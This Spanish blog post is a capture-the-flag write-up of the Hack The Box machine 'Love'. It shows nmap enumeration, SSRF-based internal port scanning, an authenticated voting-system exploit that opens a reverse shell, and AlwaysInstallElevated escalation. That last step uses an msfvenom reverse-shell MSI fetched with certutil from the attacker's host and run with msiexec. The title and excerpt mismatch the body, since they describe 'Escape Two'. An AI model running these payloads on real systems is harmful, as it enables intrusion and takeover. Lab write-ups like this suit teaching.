---
layout: single
title: Hack The Box - Escape Two
excerpt: "Escape Two es una máquina fácil de Hack The Box que simula un escenario real con credenciales de un usuario de bajo privilegio. La clave está en la enumeración, accediendo a servicios como SMB y MSSQL, e incluso extrayendo datos de archivos corruptos. Para escalar privilegios, se usa BloodHound y se explotan los permisos WriteOwner y la vulnerabilidad ESC4."
date: 2025-08-01
classes: wide
header:
  teaser: /assets/images/htb-writeup-Love/Love.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - Hackthebox
  - Web Pentesting
tags:  
  - Voting System 
  - MSSQL
  - AlwaysInstallElevated
  - SSRF

---
<style>
body {
  margin: 0;
  padding: 0;
}

/* Estilo general */
.glitch {
  position: relative;
  width: 50%;
  max-width: 400px;
  height: auto;
  aspect-ratio: 1 / 1;
  background-image: url("/assets/images/htb-writeup-Love/Love.png");
  background-size: cover;
  background-position: center;
  margin: auto;
}

/* Glitch efecto */
.glitch:before {
  content: '';
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background-image: url("/assets/images/htb-writeup-Love/Love.png");
  background-size: cover;
  background-position: center;
  opacity: 0.5;
  mix-blend-mode: hard-light;
  animation: glitch2 10s linear infinite;
}

.glitch:hover:before {
  animation: glitch1 1s linear infinite;
}

/* Animaciones */
@keyframes glitch1 {
  0% { background-position: 0 0; filter: hue-rotate(0deg); }
  10% { background-position: 5px 0; }
  20% { background-position: -5px 0; }
  30% { background-position: 15px 0; }
  40% { background-position: -5px 0; }
  50% { background-position: -25px 0; }
  60% { background-position: -50px 0; }
  70% { background-position: 0 -20px; }
  80% { background-position: -60px -20px; }
  81% { background-position: 0 0; }
  100% { background-position: 0 0; filter: hue-rotate(360deg); }
}

@keyframes glitch2 {
  0% { background-position: 0 0; filter: hue-rotate(0deg); }
  10% { background-position: 15px 0; }
  15% { background-position: -15px 0; }
  20% { filter: hue-rotate(360deg); }
  25% { background-position: 0 0; filter: hue-rotate(0deg); }
  100% { background-position: 0 0; filter: hue-rotate(0deg); }
}

/* Ajuste responsive tablets */
@media (max-width: 767.5px) {
  .glitch {
    width: 80%;
    aspect-ratio: 1 / 1;
  }
}

/* Ajuste responsive móviles */
@media (max-width: 575.5px) {
  .glitch {
    width: 90%;
    aspect-ratio: 1 / 1;
  }
}
</style>


<body>
    <div class="glitch">  
    </div>
</body>

<br>

`Love` es una máquina fácil de Hack The Box que simula un escenario real con credenciales de un usuario de bajo privilegio. La clave está en la enumeración, accediendo a servicios como SMB y MSSQL, e incluso extrayendo datos de archivos corruptos. Para escalar privilegios, se usa BloodHound y se explotan los permisos WriteOwner y la vulnerabilidad ESC4.

## Enumeración

Realizando un escaneo de puertos TCP identifique los siguientes abiertos:

```bash
Nmap scan report for 10.10.10.239
Host is up, received user-set (0.28s latency).
Scanned at 2025-06-26 01:22:34 EDT for 178s

PORT      STATE SERVICE      REASON          VERSION
80/tcp    open  http         syn-ack ttl 127 Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
443/tcp   open  ssl/http     syn-ack ttl 127 Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
445/tcp   open  microsoft-ds syn-ack ttl 127 Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql?       syn-ack ttl 127
5000/tcp  open  http         syn-ack ttl 127 Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
5040/tcp  open  unknown      syn-ack ttl 127
5986/tcp  open  ssl/http     syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
7680/tcp  open  pando-pub?   syn-ack ttl 127
47001/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
```
Realicé otro escaneo con **Nmap** utilizando la opción `-sVC` para obtener información detallada de los servicios detectados, y logré identificar dos dominios: **staging.love.htb**. y **love.htb** así como un posible usuario **roy** en la información del certificado

```bash
443/tcp   open  ssl/http     syn-ack ttl 127 Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in/emailAddress=roy@love.htb/organizationalUnitName=love.htb/localityName=norway
| Issuer: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in/emailAddress=roy@love.htb/organizationalUnitName=love.htb/localityName=norway
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-01-18T14:00:16
| Not valid after:  2022-01-18T14:00:16
| MD5:   bff0:1add:5048:afc8:b3cf:7140:6e68:5ff6
| SHA-1: 83ed:29c4:70f6:4036:a6f4:2d4d:4cf6:18a2:e9e4:96c2
| -----BEGIN CERTIFICATE-----
| MIIDozCCAosCFFhDHcnclWJmeuqOK/LQv3XDNEu4MA0GCSqGSIb3DQEBCwUAMIGN
| MQswCQYDVQQGEwJpbjEKMAgGA1UECAwBbTEPMA0GA1UEBwwGbm9yd2F5MRYwFAYD
| VQQKDA1WYWxlbnRpbmVDb3JwMREwDwYDVQQLDAhsb3ZlLmh0YjEZMBcGA1UEAwwQ
| c3RhZ2luZy5sb3ZlLmh0YjEbMBkGCSqGSIb3DQEJARYMcm95QGxvdmUuaHRiMB4X
| DTIxMDExODE0MDAxNloXDTIyMDExODE0MDAxNlowgY0xCzAJBgNVBAYTAmluMQow
| CAYDVQQIDAFtMQ8wDQYDVQQHDAZub3J3YXkxFjAUBgNVBAoMDVZhbGVudGluZUNv
| cnAxETAPBgNVBAsMCGxvdmUuaHRiMRkwFwYDVQQDDBBzdGFnaW5nLmxvdmUuaHRi
| MRswGQYJKoZIhvcNAQkBFgxyb3lAbG92ZS5odGIwggEiMA0GCSqGSIb3DQEBAQUA
| A4IBDwAwggEKAoIBAQDQlH1J/AwbEm2Hnh4Bizch08sUHlHg7vAMGEB14LPq9G20
| PL/6QmYxJOWBPjBWWywNYK3cPIFY8yUmYlLBiVI0piRfaSj7wTLW3GFSPhrpmfz0
| 0zJMKeyBOD0+1K9BxiUQNVyEnihsULZKLmZcF6LhOIhiONEL6mKKr2/mHLgfoR7U
| vM7OmmywdLRgLfXN2Cgpkv7ciEARU0phRq2p1s4W9Hn3XEU8iVqgfFXs/ZNyX3r8
| LtDiQUavwn2s+Hta0mslI0waTmyOsNrE4wgcdcF9kLK/9ttM1ugTJSQAQWbYo5LD
| 2bVw7JidPhX8mELviftIv5W1LguCb3uVb6ipfShxAgMBAAEwDQYJKoZIhvcNAQEL
| BQADggEBANB5x2U0QuQdc9niiW8XtGVqlUZOpmToxstBm4r0Djdqv/Z73I/qys0A
| y7crcy9dRO7M80Dnvj0ReGxoWN/95ZA4GSL8TUfIfXbonrCKFiXOOuS8jCzC9LWE
| nP4jUUlAOJv6uYDajoD3NfbhW8uBvopO+8nywbQdiffatKO35McSl7ukvIK+d7gz
| oool/rMp/fQ40A1nxVHeLPOexyB3YJIMAhm4NexfJ2TKxs10C+lJcuOxt7MhOk0h
| zSPL/pMbMouLTXnIsh4SdJEzEkNnuO69yQoN8XgjM7vHvZQIlzs1R5pk4WIgKHSZ
| 0drwvFE50xML9h2wrGh7L9/CSbhIhO8=
|_-----END CERTIFICATE-----
```
Posteriormente, agregué los dominio al archivo **/etc/hosts**, apuntándolo a la IP de la máquina víctima para poder visualizar correctamente las páginas web.

```bash
┌──(root㉿kali)-[/home/kali]
└─# cat /etc/hosts                
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.10.10.239 love.htb staging.love.htb 
```
## Enumeración WEB

Al consultar el dominio `love.htb` me encontré con un sistema de votaciones:

![](/assets/images/htb-writeup-Love/.votpng)

Comencé enumerando el sitio web revisando su tecnología implementada, realizando un escaneo de archivos y directorios pero no encontré nada interesante.

![](/assets/images/htb-writeup-Love/cap.png)

```bash
┌──(root㉿kali)-[/home/kali]
└─# gobuster dir -u http://love.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://love.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,txt,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 298]
/images               (Status: 301) [Size: 330] [--> http://love.htb/images/]
/index.php            (Status: 200) [Size: 4388]
/home.php             (Status: 302) [Size: 0] [--> index.php]
/login.php            (Status: 302) [Size: 0] [--> index.php]
/Images               (Status: 301) [Size: 330] [--> http://love.htb/Images/]
/admin                (Status: 301) [Size: 329] [--> http://love.htb/admin/]
/Home.php             (Status: 302) [Size: 0] [--> index.php]
/plugins              (Status: 301) [Size: 331] [--> http://love.htb/plugins/]
/includes             (Status: 301) [Size: 332] [--> http://love.htb/includes/]
/Index.php            (Status: 200) [Size: 4388]
/Login.php            (Status: 302) [Size: 0] [--> index.php]
/examples             (Status: 503) [Size: 398]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/preview.php          (Status: 302) [Size: 0] [--> index.php]
/dist                 (Status: 301) [Size: 328] [--> http://love.htb/dist/]
/licenses             (Status: 403) [Size: 417]
```
Tras revisar el sitio web alojado en el puerto 5000 solamente me encontré con un`Forbidden` 

![](/assets/images/htb-writeup-Love/forbidden.png)

Posteriormente revise el sitio web alojado en el subdominio `staging.love.htb` el cual se trata de un sitio de escaneo de archivos libre 

![](/assets/images/htb-writeup-Love/free.png)

## SSRF (Server Side Request Forgery)

En Demo puede ingresarse una URL de un archivo para que se escanee 

![](/assets/images/htb-writeup-Love/demo.png)

Realice una prueba colocando un servidor temporal y llamando a un archivo de prueba, lo cual funciono, esto me da indicios de que pueda tratarse de una vulnerabilidad SSRF(Server Side Request Forgey) 

```bash
┌──(root㉿kali)-[/opt]
└─# python3 -m http.server 80   
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.239 - - [27/Jun/2025 16:08:11] "GET /test.txt HTTP/1.1" 200 -
```
![](/assets/images/htb-writeup-Love/test.png)

Para validar la vulnerabilidad copie el archivo `index.html` de apache, coloque un servidor temporal y llame al archivo 

![](/assets/images/htb-writeup-Love/apache.png)

Ahora que confirme la vulnerabilidad, llame un archivo interno del sistema a modo de ejemplo el cual también funciono con éxito

![](/assets/images/htb-writeup-Love/etc.png)

Algo que puede realizarse mediante un SSRF es una enumeración de puertos internos del sistema, primero genere una lista con los 65535 puertos 

```bash
for port in {1..65535};do echo $port >> ports.txt;done
```

Después realice una consulta a un puerto interno aleatorio que no esta abierto para ver el tamaño de la consulta cuando se realiza a puertos cerrados

```bash
┌──(root㉿kali)-[/opt/a]
└─# curl -i -s -X POST http://staging.love.htb/beta.php -H "Content-Type: application/x-www-form-urlencoded" -d 'file=http://127.0.0.1:1&read=Scan+file'
HTTP/1.1 200 OK
Date: Fri, 27 Jun 2025 20:55:09 GMT
Server: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
X-Powered-By: PHP/7.3.27
Content-Length: 4997
Content-Type: text/html; charset=UTF-8

<html>
<title> File security checker </title>



<!DOCTYPE html>
<html>
...SNIP...
```

El contenido a consultas donde el puerto esta cerrado es `4997`, con ffuf  realice un escaneo excluyendo las solicitudes con ese numero para poder enumerar puertos abiertos internos.

```bash
┌──(root㉿kali)-[/opt]
└─# ffuf -w ./ports.txt:PORT -u http://staging.love.htb/beta.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "file=http://127.0.0.1:PORT&read=Scan+file" -fs 4997

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://staging.love.htb/beta.php
 :: Wordlist         : PORT: /opt/ports.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : file=http://127.0.0.1:PORT&read=Scan+file
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 4997
________________________________________________

80                      [Status: 200, Size: 9385, Words: 1901, Lines: 337, Duration: 2118ms]
443                     [Status: 200, Size: 5466, Words: 1296, Lines: 224, Duration: 240ms]
```

Finalmente, realice una petición al puerto 5000 que me marcaba `Forbidden` y pude  encontrar credenciales

![](/assets/images/htb-writeup-Love/.passng)

Al intentar probar las credenciales en el sistema de votación no funcionaron; sin embargo, hay un [exploit](https://www.exploit-db.com/exploits/49445)  para este sistema que como requisitos requieres estar autenticado así que lo probare 

```bash
# --- Edit your settings here ----
IP = "love.htb" # Website's URL
USERNAME = "admin" #Auth username
PASSWORD = "@LoveIsInTheAir!!!!" # Auth Password
REV_IP = "10.10.16.2" # Reverse shell IP
REV_PORT = "443" # Reverse port 
# --------------------------------
```

Pero al momento de ejecutarlo no funciono

```bash
┌──(root㉿kali)-[/opt]
└─# python3 voting_system_exploits.py 
Start a NC listner on the port you choose above and run...
```                                                          

Al analizar el epxloit veo que las siguientes rutas no las tiene el servidor

```bash
INDEX_PAGE = f"http://{IP}/votesystem/admin/index.php"
LOGIN_URL = f"http://{IP}/votesystem/admin/login.php"
VOTE_URL = f"http://{IP}/votesystem/admin/voters_add.php"
CALL_SHELL = f"http://{IP}/votesystem/images/shell.php"
```

por lo cual regresando a mi enumeración de archivos y directorios pude ver la ruta verdadera y actualice el exploit, posteriormente se ejecuto sin problemas

```bash
INDEX_PAGE = f"http://{IP}/admin/index.php"
LOGIN_URL = f"http://{IP}/admin/login.php"
VOTE_URL = f"http://{IP}/admin/voters_add.php"
CALL_SHELL = f"http://{IP}/images/shell.php"
```

```bash
┌──(root㉿kali)-[/opt]
└─# python3 voting_system_exploits.py
Start a NC listner on the port you choose above and run...
Logged in
Poc sent successfully
```

```bash
┌──(root㉿kali)-[/home/kali]
└─# rlwrap nc -lvp 443
listening on [any] 443 ...
connect to [10.10.16.2] from love.htb [10.10.10.239] 54874
b374k shell : connected

Microsoft Windows [Version 10.0.19042.867]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\omrs\images>whoami
whoami
love\phoebe

C:\xampp\htdocs\omrs\images>
```
## Escalada de privilegios

Para la escalación de privilegios ejecute winpeas y algo que llamo mi atención fue la siguiente linea:

```bash
Checking AlwaysInstallElevated
 https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#alwaysinstallelevated
    AlwaysInstallElevated set to 1 in HKLM!
    AlwaysInstallElevated set to 1 in HKCU!
```

Después de una investigación encontré que Windows incluye una configuración de política llamada `AlwaysInstallElevated`, al estar habilitada tanto en el ámbito de usuario como en el de equipo, permite que los instaladores MSI se ejecuten con privilegios elevados, incluso si los inicia un usuario estándar. Para determinar que se encuentra esta configuración el valor  `AlwaysInstallElevated`debe estar establecido en 1 en las siguientes llaves:

- `HKLM\Software\Policies\Microsoft\Windows\Installer`
- `HKCU\Software\Policies\Microsoft\Windows\Installer`

primero comprobé el valor de ambas llaves

```bash
PS C:\Users\Phoebe> reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\Software\Policies\Microsoft\Windows\Installer

HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1

PS C:\Users\Phoebe> reg query HKCU\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer

HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

Para la explotación utilice msfvenom para crear un archivo msi 

```bash
┌──(root㉿kali)-[/opt/chuleta]
└─#  msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.2 LPORT=4443 -f msi > p3rr1n.msi
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of msi file: 159744 bytes
```

Después pase el archivo a la maquina victima

```bash
PS C:\Users\Phoebe> certutil.exe -f -urlcache -split http://10.10.16.2/p3rr1n.msi p3rr1n.msi
certutil.exe -f -urlcache -split http://10.10.16.2/p3rr1n.msi p3rr1n.msi
****  Online  ****
  000000  ...
  027000
CertUtil: -URLCache command completed successfully.
```

Finalmente coloque mi listener en el puerto 4443 y ejecute el archivo msi para recibir la shell como administrador

```bash
PS C:\Users\Phoebe> msiexec /quiet /qn /i C:\Users\Phoebe\p3rr1n.msi
msiexec /quiet /qn /i C:\Users\Phoebe\p3rr1n.msi
PS C:\Users\Phoebe> 
```

```bash
┌──(root㉿kali)-[/opt/chuleta]
└─# nc -lvp 4443
listening on [any] 4443 ...
connect to [10.10.16.2] from love.htb [10.10.10.239] 61650
Microsoft Windows [Version 10.0.19042.867]
(c) 2020 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>whoami
whoami
nt authority\system

C:\WINDOWS\system32>
```
 
